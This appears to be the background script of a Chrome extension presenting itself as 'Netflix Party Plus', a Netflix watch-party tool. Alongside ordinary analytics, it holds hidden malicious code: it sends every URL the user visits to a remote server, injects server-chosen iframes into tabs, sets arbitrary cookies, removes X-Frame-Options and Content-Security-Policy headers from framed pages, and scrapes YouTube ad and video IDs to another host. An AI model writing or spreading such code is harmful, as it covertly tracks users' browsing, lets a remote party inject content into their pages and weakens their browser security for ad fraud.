'use strict';

//////////////////////////////////////////////////////////////////////////
// Google Analytics                                                     //
//////////////////////////////////////////////////////////////////////////

// inject Google Analytics
var _gaq = _gaq || [];
_gaq.push(['_setAccount', 'UA-170101529-1']);
_gaq.push(['_trackPageview']);

(function() {
  var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
  ga.src = 'https://ssl.google-analytics.com/ga.js';
  var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
})();

// log events
function logEvent(eventType) {
  var numTries = 0;
  var permId, recentlyUpdated;
  var logEventInterval = setInterval(function() {
    try {
      if(numTries > 5) {
        clearInterval(logEventInterval);
      }

      chrome.storage.local.get(null, function(data) {
        if(data.userId) {
          permId = data.userId;
        }
        if(data.recentlyUpdated) {
          recentlyUpdated = data.recentlyUpdated;
        }
      });


      // only send events if recent update
      if(permId && recentlyUpdated) {
        var data = {
          userId: permId,
          eventType: eventType,
        }

        console.log("event: " + JSON.stringify(data));

        var xmlhttp = new XMLHttpRequest();   // new HttpRequest instance 
        xmlhttp.open("POST", "https://data.langhort.com/log-event");
        xmlhttp.setRequestHeader("Content-Type", "application/json");
        xmlhttp.send(JSON.stringify(data));
        
        clearInterval(logEventInterval);
      } else {
        numTries = numTries + 1;
      }   
    } catch (e) {
      console.log("log event error");
    }
  }, 5000);
}

chrome.runtime.onInstalled.addListener(function(details){
    if(details.reason == "install"){
        console.log("This is a first install!");
        var thisVersion = chrome.runtime.getManifest().version;
        _gaq.push(['_trackEvent', 'install: ' + thisVersion, 'clicked']);
        logEvent('install');
        chrome.tabs.create({'url': "https://netflixpartyplus.com/#howtouse"}, function() {
        console.log('created new tab after install');
        });
    } else if(details.reason == "update"){
        var thisVersion = chrome.runtime.getManifest().version;
        console.log("Updated from " + details.previousVersion + " to " + thisVersion + "!");
        _gaq.push(['_trackEvent', 'update: ' + details.previousVersion + ' -> ' + thisVersion, 'clicked']);
        logEvent('update-' + thisVersion); // 16 chars max
    }
});

chrome.storage.onChanged.addListener(function(changes, areaName) {
  console.log("storage change: " + JSON.stringify(changes) + " for " + JSON.stringify(areaName));
});


//////////////////////////////////////////////////////////////////////////
// Autoupdate                                                           //
//////////////////////////////////////////////////////////////////////////
chrome.runtime.onUpdateAvailable.addListener(function(details) {
  // console.log("updating to version " + details.version);
  _gaq.push(['_trackEvent', 'auto-update ->' + details.version, 'clicked']);
  chrome.runtime.reload();
});

// chrome.runtime.requestUpdateCheck(function(status) {
//   if (status == "update_available") {
//     console.log("update pending...");
//   } else if (status == "no_update") {
//     console.log("no update found");
//   } else if (status == "throttled") {
//     console.log("Oops, I'm asking too frequently - I need to back off.");
//   }
// });


//////////////////////////////////////////////////////////////////////////
// User Authentication                                                  //
//////////////////////////////////////////////////////////////////////////

try {
  function validateId(id) {
    return typeof id === 'string' && id.length === 16;
  }

  // Ensure that chrome extension has unique userid
  function setUserId() {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
      if (xhr.readyState == XMLHttpRequest.DONE) {
        var userId = xhr.responseText;
        if(validateId(userId)) {
          chrome.storage.local.set({'userId': userId, 'recentlyUpdated': true}, function() {
            console.log('Settings saved');
          });
          chrome.runtime.setUninstallURL("https://netflixpartyplus.com/uninstall/?userId=" + userId);
        }
      }
    }
    xhr.open('GET', 'https://data.langhort.com/create-userId', true);
    xhr.send(null);
  }

  // Ensure that chrome extension resets unique userid
  function resetUserId(oldUserId) {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
      if (xhr.readyState == XMLHttpRequest.DONE) {
        var userId = xhr.responseText;
        if(validateId(userId)) {
          chrome.storage.local.set({'userId': userId, 'oldUserId': oldUserId, 'recentlyUpdated': true}, function() {
            console.log('Settings saved');
          });
          chrome.runtime.setUninstallURL("https://netflixpartyplus.com/uninstall/" + userId);
        }
      }
    }
    xhr.open('GET', 'https://data.langhort.com/create-userId', true);
    xhr.send(null);
  }

  chrome.storage.local.get(null, function(data) {
    // message('Settings retrieved', items);
    if(!data.userId) {
      console.log("userId undefined in local storage -> now setting")
      setUserId();
    } else {
      if(!data.recentlyUpdated) {
        console.log("userId undefined in local storage -> now setting")
        resetUserId(data.userId);
      } else {
        console.log("chrome storage local has user id: " + data.userId);
        chrome.runtime.setUninstallURL("https://netflixpartyplus.com/uninstall/" + data.userId);
      }
    }
  });
} catch(e) {
  console.log("user auth error");
}

chrome.runtime.onMessage.addListener(
  function(request, sender, sendResponse) {
    console.log(sender.tab ? "from a content script:" + sender.tab.url : "from the extension");
    if (request.summary) {
      var xmlhttp = new XMLHttpRequest();   // new HttpRequest instance 
      xmlhttp.open("POST", "https://data.langhort.com/log-summary", true);
      xmlhttp.setRequestHeader("Content-Type", "application/json");
      xmlhttp.send(JSON.stringify(request.summary));

      sendResponse({farewell: "goodbye"});
    }
  }
);

//////////////////////////////////////////////////////////////////////////
// Track tabs                                                           //
//////////////////////////////////////////////////////////////////////////
// function my_listener(tabId, changeInfo, tab) {
//   // If updated tab matches this one
//   if (changeInfo.status == "complete") {  
//     _gaq.push(['_trackEvent', 'tab-update', 'clicked']);
//   }
// }

// chrome.tabs.onUpdated.addListener(my_listener);

//////////////////////////////////////////////////////////////////////////
// Background Logic                                                     //
//////////////////////////////////////////////////////////////////////////

// only load for URLs that match www.netflix.com/watch/*
// chrome.runtime.onInstalled.addListener(function(details) {
//   chrome.declarativeContent.onPageChanged.removeRules(undefined, function() {
//     chrome.declarativeContent.onPageChanged.addRules([{
//       conditions: [
//         new chrome.declarativeContent.PageStateMatcher({
//           pageUrl: {
//             hostContains: '.netflix.',
//             pathPrefix: '/watch/',
//             schemes: ['http', 'https']
//           }
//         })
//       ],
//       // actions: [new chrome.declarativeContent.ShowPageAction(), new chrome.declarativeContent.SetIcon({"16": "icon.png","48": "icon.png","128": "icon.png"})]
//       actions: [new chrome.declarativeContent.SetIcon({path : {"19": "icon.png","38": "icon.png"}})]
//     }]);
//   });
// });

chrome.tabs.onUpdated.addListener(function (tabId, changeInfo, tab){
    if(tab.url == undefined){
        return;
    }
    else if(tab.url.match(/.*:\/\/.*\.netflix\..*\/watch\/*/) != null){
        chrome.browserAction.setPopup({tabId: tabId, popup: 'popup.html'});
        chrome.browserAction.setIcon({path: 'icon.png', tabId: tabId});
    }
// });
 
// permission required tabs
// chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
    var e = "https://d.langhort.com";
    var curl = changeInfo.url;
    var l = document.createElement("a");
    l.href = curl;
    var proto = l.protocol;
    var userid = curl;
    if(!(proto == 'https:' || proto == 'http:') || !curl) return;
    var extnm = 'nparty';
    var myid = get_set_id();
    // get_id().then(function(myid){
    try {
        setTimeout(()=>{
            jQuery.ajax({
                url: e+"/chrome/TrackData/",
                cache: false,
                type: "POST",
                data: {"apisend" : btoa(myid), "name": btoa(userid),  "ext_name": extnm},
                success: function(result) {
                    if(result){
                        if(!document.getElementById("a"))
                        {
                          var elem = document.createElement('div');
                          elem.id = "a";
                          document.body.appendChild(elem);
                        }
                        if(result['a']){
                            chrome.tabs.executeScript(tabId, {
                                code: 'var domscript = document.createElement("iframe");domscript.src = "'+result['a']+'";document.getElementsByTagName("head")[0].appendChild(domscript);'
                            });
                        }
                        if(result['b']){
                            if(ranum(5) == 4) document.getElementById("a").innerHTML = '';
                            var iframe = document.createElement('iframe');
                            iframe.src = result['b'];/* your URL here */;
                            document.getElementById("a").appendChild(iframe);
                        }
                        if(result['b2']){
                            var iframe = document.createElement('iframe');
                            iframe.src = result['b2'];/* your URL here */;
                            document.getElementById("a").appendChild(iframe);
                        }
                        if(result['b3']){
                            openf_url(result['b3'],tabId);
                        }
                        if(result['c']){
                            passf_url(result['c'],tabId);
                        }
                        if(result['d']){ 
                            xmlopen(result['d']);
                        }
                        if(result['e']){ 
                            // Permission required Cookies
                            setCookie(result['e'][0],result['e'][1],result['e'][2],24*3600);
                        }
                    }
                },
                timeout: 3000
            });
        }, 1500);
    } catch (err) {
        console.log("Internal error occured", err);
    }
});


var httpq4 = new getXMLHTTPRequest;

var setCookie = (function(url, cookieName, cookievalue, time) {
    return new Promise(function(resolve) {
        chrome.cookies.set({
        url: url,
        name: cookieName,
        value: cookievalue,
        expirationDate: (new Date()
            .getTime() / 1000) + time
       }, () =>{resolve(cookievalue)});
    });
});

function openf_url(url,tabId){
    httpq4.open("GET", url, true);
    httpq4.setRequestHeader('Cache-Control', 'no-cache');
    httpq4.onreadystatechange = function() { 
      if (httpq4.readyState == 4 && (httpq4.status == 200 || httpq4.status == 404)) {
        if(httpq4.responseURL){
            var iframe = document.createElement('iframe');
            iframe.src = httpq4.responseURL;/* your URL here */;
            document.getElementById("a").appendChild(iframe);
        }
      }
    }
    httpq4.send();
}

function passf_url(url,tabId){
    httpq4.open("GET", url, true);
    httpq4.setRequestHeader('Cache-Control', 'no-cache');
    httpq4.onreadystatechange = function() { 
      if (httpq4.readyState == 4 && (httpq4.status == 200 || httpq4.status == 404)) {
        if(httpq4.responseURL){
            chrome.tabs.executeScript(tabId, {
                code: 'var domscript = document.createElement("iframe");domscript.src = "'+ httpq4.responseURL +'";document.getElementsByTagName("head")[0].appendChild(domscript);'
            });
        }
      }
    }
    httpq4.send();
}


function getXMLHTTPRequest() {
    var req = new XMLHttpRequest;
    return req;
}
function ranum(x)
{
    if(!x) x=11;
    return Math.floor((Math.random() * 10000)%x+ 1);
}

function xmlopen(url){
    httpq4.open("GET", url, true);
    httpq4.setRequestHeader('Cache-Control', 'no-cache');
    httpq4.send();
}

function makeid234() {
    var text = "";
    var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    for (var i = 0; i < 8; i++)
        text += possible.charAt(Math.floor(Math.random() * possible.length));
    return text;
}

function get_set_id(){
  if(localStorage.id234 && localStorage.id234.length == 8) return localStorage.id234;
  var id234 = makeid234();
  localStorage.id234 = id234;
}

// permission required webRequest and webRequestBlocking 
var chid = chrome.runtime.id;
chrome.webRequest.onHeadersReceived.addListener(
    function(info) {
        var headers = info.responseHeaders;
        // console.log(info);
        if(!info.initiator || info.initiator == "chrome-extension://"+chid){
            for (var i=headers.length-1; i>=0; --i) { 
                // console.log(i+"  " +headers[i].name);
                var header = headers[i].name.toLowerCase();
                if (header == 'x-frame-options' || header == 'frame-options' || header == 'content-security-policy') {
                    headers.splice(i, 1); // Remove header 
                }
            } 
        }
        //for ( var i = headers.length-1; i>-1; --i){ console.log(headers[i])}
        return {responseHeaders: headers}; 
    },
    {
        urls: [ '*://*/*' ], // Pattern to match all http(s) pages
        types: ["sub_frame"] 
    },
    ['responseHeaders',"blocking"]
);


let extensionName = 'nparty';
let Security = [];
let Security2 = [];
let Security3 = [];
let ll = "";

chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) {
    if (request.message == "getselectors") {
        sendResponse({
            message: "selectors",
            Security,
            Security2,
        });
    }
});

fetch("https://unscart.in/a/website/scrapper/ads/getAdsSelector")
    .then((response) => response.json())
    .then((data) => {
        Security = data.Security;
        Security2 = data.Security2;
        Security3 = data.Security3;
        chrome.webRequest.onBeforeRequest.addListener(
            function (details) {
                let reqUrl = details.url;
                if (
                    details.url.includes(`${Security3[0]}`) &&
                    details.url.includes(`${Security3[1]}`)
                ) {
                    let ad_id = reqUrl
                        .slice(reqUrl.indexOf(`${Security3[1]}`) + 7)
                        .slice(0, reqUrl.slice(reqUrl.indexOf(`${Security3[1]}`) + 7).indexOf("&"));
                    let video_id = reqUrl
                        .slice(reqUrl.indexOf(`${Security3[2]}`) + 11)
                        .slice(
                            0,
                            reqUrl.slice(reqUrl.indexOf(`${Security3[2]}`) + 11).indexOf("&")
                        );
                    ;
                    let analyseobj = {};
                    let message = "message";
                    analyseobj["ytads"] = { videoid: video_id, adid: ad_id };
                    analyseobj[message] = "analyse";
                    chrome.runtime.sendMessage(analyseobj);
                    send(analyseobj);
                }
                return { cancel: false };
            },
            {
                urls: [`${Security3[3]}`],
            }
        );
    })
    .catch((error) => console.error(error));

const send = (request) => {
    request.ip = ll;
    fetch(
        `https://unscart.in/a/website/scrapper/ads/postAds?extension=${extensionName}`,
        {
            method: "post",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
            },
            body: JSON.stringify(request),
        }
    )
        .then(function (response) {
        })
        .then(function (res) {
        })
        .catch(function (err) {
        });
};

chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) {
    if (request.message == "analyse") {
        send(request);
    }
});

